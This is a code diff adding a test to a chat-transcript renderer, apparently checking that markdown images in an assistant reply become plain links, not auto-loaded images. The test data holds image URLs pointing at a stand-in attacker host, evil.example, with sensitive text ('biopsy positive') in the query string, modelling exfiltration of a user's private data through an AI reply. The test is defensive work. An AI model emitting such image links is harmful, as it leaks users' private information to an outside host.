@@ -1404,6 +1404,35 @@ describe('the transcript', () => {
     expect(prose.querySelector('ol')).not.toBeNull();
   });
 
+  it('never loads a reply’s image on its own: it is a link to it, named by its alt text', async () => {
+    await openSaved(
+      ROW,
+      stored(
+        { id: 'm1', role: 'user', content: 'Show me' },
+        {
+          id: 'm2',
+          role: 'assistant',
+          content:
+            'Here ![chart](https://evil.example/p.png?q=biopsy%20positive) and ![](https://evil.example/bare.png).\n\n' +
+            '[![badge](https://evil.example/b.png?q=x)](https://example.com/docs) and [a plain link](https://example.com/a "A title").',
+          replyTo: 'm1',
+        }
+      )
+    );
+    const reply = document.querySelector('[data-message-id="m2"]') as HTMLElement;
+    expect(reply.querySelector('img')).toBeNull();
+    const links = Array.from(reply.querySelectorAll('a')).map((a) => [a.textContent, a.getAttribute('href')]);
+    expect(links).toEqual([
+      ['chart', 'https://evil.example/p.png?q=biopsy%20positive'],
+      ['https://evil.example/bare.png', 'https://evil.example/bare.png'],
+      // An image inside a link is its alt text: one link, never one inside another.
+      ['badge', 'https://example.com/docs'],
+      ['a plain link', 'https://example.com/a'],
+    ]);
+    expect(reply.querySelector('a a')).toBeNull();
+    expect(reply.querySelector('a[title="A title"]')).not.toBeNull();
+  });
+
   describe('Load earlier', () => {
     const PAGE = stored(
       { id: 'm3', role: 'user', content: 'three', pos: 2 },
